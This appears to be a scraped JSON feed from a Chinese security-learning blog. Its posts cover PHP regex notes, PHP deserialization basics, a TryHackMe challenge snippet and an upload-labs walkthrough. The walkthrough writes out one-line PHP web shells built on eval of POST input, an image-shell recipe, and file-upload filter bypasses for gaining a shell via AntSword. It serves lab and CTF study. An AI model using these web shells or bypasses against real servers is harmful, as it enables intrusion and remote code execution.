class=\"keyword\">protected</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addMe</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Add Failed. Filename:&quot;</span> . <span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$args</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>([<span class=\"variable\">$this</span>, <span class=\"variable\">$func</span> . <span class=\"string\">&quot;Me&quot;</span>], <span class=\"variable\">$args</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">c</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">string</span> = <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$var</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$var</span>[<span class=\"variable\">$name</span>]();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;tryhackme&quot;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>pop:<br>\n 后面搞</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "url": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "title": "正则表达式",
            "date_published": "2023-04-27T10:41:31.571Z",
            "content_html": "<h2>语法</h2>\n<p>runoo+b,可以匹配runoob,runooob,runoooooob等,+号代表前面的字符至少出现一次(一次或者多次)</p>\n<p>runoob*b,可以匹配runob,runoob,runooooob,*号代表*前面的字符可以不出现,也可以出现一次或者多次</p>\n<p>colou?r可以匹配color,colour,?代表前面的字符最多可以出现一次(<strong>0次或者一次</strong>)</p>\n<h2>普通字符</h2>\n<li>[ABC],会匹配[...]中的所有字符</li>\n<li>[^ABC],会匹配除了[...]中的所有字符</li>\n<li>[A-Z],表示一个区间会匹配所有大写字母</li>\n<li>/./匹配除换行符之外的任何单个字符</li>\n<li>[\\s\\S]匹配所有,\\s匹配所有空白符,包括换行,\\S非空白符,不包括换行</li>\n<li>\\w匹配字符数字下划线,等价于[A-Za-z0-9_]</li>\n<li>$匹配输入字符串的结尾位置</li>\n<li>{n},n是一个非负整数,匹配确定的n次,eg.o{2}不能匹配\"Bob\"中的o,但是能匹配\"food\"中的两个o</li>\n<li>{n,},至少匹配n次,o{2,}不能匹配\"Bob\"中的o,但能匹配\"fooood\"中的所有的o,o{1,}等价o+,o{0,}等价o*</li>\n<h3>定位符</h3>\n<li>^匹配输入字符串开始的地方</li>\n<li>$匹配输入字符串结尾的地方</li>\n<li>\\b匹配一个单词边界</li>\n<li>\\B匹配非单词边界</li>\n<li>\\d匹配一个数字字符</li>\n<li>\\D匹配一个非数字字符</li>\n<li>\\f匹配一个换页符</li>\n<h3>修饰符</h3>\n/pattern/i 不区分大小写\n/pattern/g 全局匹配,查找所有的匹配项\n/pattern/m 多行匹配,使边界字符^和$匹配每一行的开头和结尾\n/pattern/s 使特殊字符圆点.中包含换行符<code>\\n</code>\n<p>正则表达式的开始和结束除了 /…/ 还可以用 @…@</p>\n<h2>1.preg_match()</h2>\n执行一个正则表达式匹配\n<code>int preg_match(string $pattern,string $subject[, array &$matches [, int $flags = 0 [, int $offset = 0 ]]])</code>\n$pattern是要搜索的模式,字符串形式\n$subject是输入字符串\n$match:如果提供此参数,它将被填充为搜索结果,$matchs[0]将包含完整模式匹配的文本,$match[1]将包含第一个捕获子组匹配到的文本\n返回值将是0或者1,因为preg_match在匹配一次后将会自动停止搜索\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "url": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "title": "upload-labs靶场",
            "date_published": "2023-04-27T09:53:21.634Z",
            "content_html": "<h3 id=\"第一题\"><a class=\"markdownIt-Anchor\" href=\"#第一题\">#</a> 第一题</h3>\n<p>一句话木马</p>\n<p>phpinfo();<br>\n@eval($_POST[‘zoe’]);<br>\n?&gt;</p>\n<p>1. 将 php 后缀改成 png/gif 等符合条件的后缀上传抓包，将后缀改成 php 放包即可成功上传<br>\n用蚁剑添加数据<br>\n 2.F12-&gt; 调试器 -&gt; 设置里禁用 js<br>\n3. 复制网页源代码保存到文件中，删掉里面的 js 部分，添加 action 部分，打开即可</p>\n<h3 id=\"第二题\"><a class=\"markdownIt-Anchor\" href=\"#第二题\">#</a> 第二题</h3>\n<p>MIME 类型<br>\n抓包改 content-type 为符合条件的就行<br>\n eg.image-png</p>\n<h3 id=\"第三题\"><a class=\"markdownIt-Anchor\" href=\"#第三题\">#</a> 第三题</h3>\n<p>黑名单类型 - 修改后缀绕过</p>\n<ul>\n<li>用黑名单不允许上传 <code>.asp,.aspx,.php,.jsp</code>  后缀的文件</li>\n<li>但可以上传 <code>.phtml .phps .php5 .pht</code></li>\n<li><mark>首选 phtml</mark></li>\n<li>前提是 apache 的 httpd.conf 中有如下配置代码</li>\n<li>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</li>\n</ul>\n<h3 id=\"第四题\"><a class=\"markdownIt-Anchor\" href=\"#第四题\">#</a> 第四题</h3>\n<p>.htaccess<br>\n 先将 httpd.conf 的文件中的 AllowOverride none 改为 ALL<br>\n1 <code>AddType application/x-httpd-php .jpg</code>  这个指令代表着 <code>.jpg</code>  文件会当做 <code>php</code>  来解析<br>\n传个 zoe.jpg</p>\n<p>2 <code>SetHandler application/x-httpd-php</code> ，意思是把所有文件都解析为 <code>php</code>  文件来执行。<br>\n写第二个命名为.htaccess 传上去<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS16b2UtaTY4ZHo3Yi54eHg=\">传个 zoe.xxx</span>, 随便什么后缀符合要求就行</p>\n<p>3. 可以用第十题的解法，利用 deldot 的漏洞</p>\n<p>补充：(原本多出的第五题)<br>\n 在 Windows 操作系统中，xx.jpg. 和 xx.jpg 空格都相当于 xx.jpg, 自动去掉了末尾的。和空格<br>\n后缀名可以是 zoe.php. .</p>\n<h3 id=\"第六题\"><a class=\"markdownIt-Anchor\" href=\"#第六题\">#</a> 第六题</h3>\n<p>此题的源码可以发现少了 strtolower 函数<br>\n黑名单之大小写绕过<br>\n将后缀改成 Php 即可</p>\n<h3 id=\"第七题\"><a class=\"markdownIt-Anchor\" href=\"#第七题\">#</a> 第七题</h3>\n<p>黑名单验证之空格绕过<br>\n这一关黑名单，没有使用 trim () 去除空格，可以使用空格绕过黑名单<br>\n bp 抓包在 content-disposition 中 php 后加个空格</p>\n<h3 id=\"第八题\"><a class=\"markdownIt-Anchor\" href=\"#第八题\">#</a> 第八题</h3>\n<p>这一关黑名单，没有使用 deldot () 过滤文件名末尾的 <code>点</code> ，可以使用文件名后加。进行绕过<br>\n抓包修改    .php. 注意这里有个.</p>\n<h3 id=\"第九题\"><a class=\"markdownIt-Anchor\" href=\"#第九题\">#</a> 第九题</h3>\n<p>特殊字符::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>绕过补充知识：</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mtext>在</mtext><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mtext>的时候如果文件名</mtext><mo>+</mo><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA绕过\n补充知识：php在window的时候如果文件名+&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">绕</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">补</span><span class=\"mord cjk_fallback\">充</span><span class=\"mord cjk_fallback\">知</span><span class=\"mord cjk_fallback\">识</span><span class=\"mord cjk_fallback\">：</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">名</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; 会把::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>之后的数据当成文件流处理</mtext><mo separator=\"true\">,</mo><mtext>不会检测后缀名，且保持</mtext><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">之</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">据</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">成</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">处</span><span class=\"mord cjk_fallback\">理</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">检</span><span class=\"mord cjk_fallback\">测</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">缀</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">保</span><span class=\"mord cjk_fallback\">持</span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; 之前的文件名 他的目的就是不检查后缀名。<br>\n抓包改后缀，php::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>浏览器地址去掉</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA\n浏览器地址去掉::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">浏</span><span class=\"mord cjk_fallback\">览</span><span class=\"mord cjk_fallback\">器</span><span class=\"mord cjk_fallback\">地</span><span class=\"mord cjk_fallback\">址</span><span class=\"mord cjk_fallback\">去</span><span class=\"mord cjk_fallback\">掉</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>data 就可以正常连接</p>\n<h3 id=\"第十题\"><a class=\"markdownIt-Anchor\" href=\"#第十题\">#</a> 第十题</h3>\n<p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行<br>\n f i l e n a m e = d e l d o t (file_name) 操作去除文件名末尾的点，构造后缀绕过黑名单<br>\n补充知识：deldot () 函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br>\n上传 zoe.php 然后用 bp 改后缀加点 == <code>空格点</code>  ==（即文件名为 <code>zoe.php. .</code> ）</p>\n<p>使用 antsword 连接   <mark>.php.</mark></p>\n<p>十一.<br>\n 双写绕过<br>\n这一关黑名单，使用 str_ireplace () 函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p>\n<blockquote>\n<p>补充知识：str_ireplace (find,replace,string,count) 函数替换字符串中的一些字符<br>\n传 <code>zoe.php</code>  然后用 bp 改后缀为 <code>.pphphp</code>  使用蚁剑连接 <code>zoe.php</code></p>\n</blockquote>\n<p>十二.get00 截断<br>\n这一关白名单，最终文件的存放位置是以拼接的方式，可以使用 %00 截断，但需要 <code>php版本&lt;5.3.4</code> ，并且 <code>magic_quotes_gpc</code>  关闭。<br>\n原理：php 的一些函数的底层是 C 语言，而 move_uploaded_file 就是其中之一，遇到 0x00 会截断，0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00。</p>\n<p>上传 <code>zoe.php</code>  用 BP 抓包修改参数，把 upload / 后面加上 <code>zoe.php%00</code> ，下面的 <code>filename=”zoe.php”</code>  改为 <code>zoe.png</code> <br>\n 用 antsword 连接时要删掉后面的注释</p>\n<p>十三.post00 截断<br>\n这一关白名单，文件上传路径拼接生成，而且使用了 post 发送的数据进行拼接，我们可以控制 post 数据进行 0x00 截断绕过白名<br>\n一句话木马抓包 zoe.php<br>\n 在 <code>../upload/</code>  路径下加上 <code>zoe.php+</code>   <code>+号</code> 是为了方便后面修改 <code>Hex</code> <br>\n <code>+号</code> 的 Hex 是 <code>2b</code> ，这里我们要把它改为 <code>00</code></p>\n<p>十四：图片马 unpack<br>\n 可以先传一个 14.php (文件包含) 到服务器，可以选择别的题目传到服务器，<mark> 目的是解析传入的图片为 PHP</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    include $file;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>再传一个图片马，14.jpg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>打开 14.php 的路径，url 输入？file = 图片马的路径</p>\n<p>补充：图片马制作<br>\n<strong>制作图片马命令</strong>：copy 图片文件名称 /b + 脚本文件名称 /a  新生成的文件名称，例如：copy 222.jpg/b+111.php/a 333.jpg<br>\n1. 先写 jpg 文件:<br>\nGIF89a<br>\n?&lt;php<br>\n@eval($_POST[‘shell’]);<br>\n?&gt;<br>\n2. 再写 php 文件<br>\n直接复制粘贴给我文件包含<br>\n 3. 制作图片马<br>\n cmd 命令：13.jpg/b+13.php/a pass13.jpg<br>\n 之间上传 pass13.jpg 将图片地址给 antsword 连接</p>\n<h1 id=\"十五getimagesize图片马\"><a class=\"markdownIt-Anchor\" href=\"#十五getimagesize图片马\">#</a> 十五 getimagesize 图片马</h1>\n<p>与上一题一样<br>\n补充:getimagesize () 函数的作用是获取图片文件的相关信息</p>\n<p>十六。跟 14,15 一样，通过文件包含和图片马 getshell</p>\n<p>十七。二次渲染绕过</p>\n<p>上传正常的 <code>GIF</code>  图片下载回显的图片，用 notepad++ 编辑器进行对比两个 GIF 图片内容，插入一句话木马，需要 python 脚本实现</p>\n<p>十八。条件竞争<br>\n看代码，它是先把图片上传上去，才开始进行判断后缀名。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除，二次渲染等等。就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序已经打开无法删除<br>\n用 burp 抓包 -&gt; 导入到 intruder 模块 -&gt; 设置类型为 null payloads,payload options 设置为 conntinue indefinitely-&gt; 在另一浏览器打开上传文件位置</p>\n<p>十九。操作与上一关差不多，配合包含漏洞</p>\n<p>二十.move_upload_file 的漏洞，会忽略 /.<br>\n1. 加 /.<br>\n2.save_name 用 %00 阶段 (PHP 版本小于 5.3)</p>\n<p>二十一<br>\n数组验证</p>\n<p>大佬的图片 https://wwe.lanzoui.com/iFSwwn53jaf<br>\n 构造的 URL 为 <code>include.php?file=upload/31608.gif</code></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "url": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "title": "php反序列化漏洞学习",
            "date_published": "2023-04-27T08:33:14.709Z",
            "content_html": "<h2 id=\"1访问控制\"><a class=\"markdownIt-Anchor\" href=\"#1访问控制\">#</a> (1). 访问控制</h2>\n<h3 id=\"1public\"><a class=\"markdownIt-Anchor\" href=\"#1public\">#</a> 1.public</h3>\n<p>公有的类成员可以在任何地方被访问<br>\n序列化后变成 <code>属性名</code></p>\n<h3 id=\"2protected\"><a class=\"markdownIt-Anchor\" href=\"#2protected\">#</a> 2.protected</h3>\n<p>受保护的类成员可以被其本身以及子类和子类访问<br>\n序列号后变成 <code>\\x00*\\x00属性名</code></p>\n<h3 id=\"3private\"><a class=\"markdownIt-Anchor\" href=\"#3private\">#</a> 3.private</h3>\n<p>私有的 1 类成员只能被其定义的所在类访问<br>\n序列化后变成 <code>\\x00类名\\x00属性名</code> <br>\n其中 <code>\\x00</code>  表示空字符，但还是占用一个字符位置 (空格)<br>\n 来看个例子叭</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">People</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$gender</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$age</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;lxy&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;gender=<span class=\"string\">&#x27;male&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;age=<span class=\"string\">&#x27;23&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">People</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出结果为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot; * gender&quot;;s:4:&quot;male&quot;;s:11:&quot; People age&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark></p>\n<ol>\n<li>如果是 print_r (), 或者 echo 的话，我们是看不到空格的 ( <code>\\x00</code> ), 所以看到的结果是</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>如果输出语句是 var_dump () 的话，看到的结果是这样</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(93) &quot;O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;\\000*\\000gender&quot;;s:4:&quot;male&quot;;s:11:&quot;\\000People\\000age&quot;;s:2:&quot;23&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>\n<p>对比可以发现 var_dump 可以发现这个空格哦</p>\n<h2 id=\"2序列化与反序列化\"><a class=\"markdownIt-Anchor\" href=\"#2序列化与反序列化\">#</a> (2). 序列化与反序列化</h2>\n<h3 id=\"1序列化\"><a class=\"markdownIt-Anchor\" href=\"#1序列化\">#</a> 1. 序列化</h3>\n<p>把对象信息转换成二进制串，serialize () 函数</p>\n<h3 id=\"2反序列化\"><a class=\"markdownIt-Anchor\" href=\"#2反序列化\">#</a> 2. 反序列化</h3>\n<p>把转化的二进制串转换为对象，unserialize () 函数</p>\n<h3 id=\"3序列化格式\"><a class=\"markdownIt-Anchor\" href=\"#3序列化格式\">#</a> 3. 序列化格式</h3>\n<h4 id=\"31头部信息\"><a class=\"markdownIt-Anchor\" href=\"#31头部信息\">#</a> 3.1 头部信息</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:数组,array</span><br><span class=\"line\">b:布尔型,Boolean</span><br><span class=\"line\">d:浮点型,double</span><br><span class=\"line\">i:整数型,integer</span><br><span class=\"line\">O:类,class</span><br><span class=\"line\">N:空,null</span><br><span class=\"line\">s:字符串,string</span><br></pre></td></tr></table></figure>\n<h4 id=\"32-格式\"><a class=\"markdownIt-Anchor\" href=\"#32-格式\">#</a> 3.2 格式</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对象类型:长度:&quot;类名&quot;:类中变量的个数:&#123;类型:长度:&quot;值&quot;;类型:长度:&quot;值&quot;;....&#125;</span><br><span class=\"line\">eg</span><br><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"33注意\"><a class=\"markdownIt-Anchor\" href=\"#33注意\">#</a> 3.3 注意</h4>\n<ol>\n<li>序列化只能序列成员 (也就是类里的变量), 不能序列方法</li>\n<li>因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话要依托这个类当前作用域存在的条件</li>\n<li>我们的思路就是通关精心构造能被控制的类的属性，利用作用域本身存在的方法发动攻击</li>\n</ol>\n<h3 id=\"4魔术方法\"><a class=\"markdownIt-Anchor\" href=\"#4魔术方法\">#</a> 4. 魔术方法</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct()            //类的构造函数，创建对象时触发</span><br><span 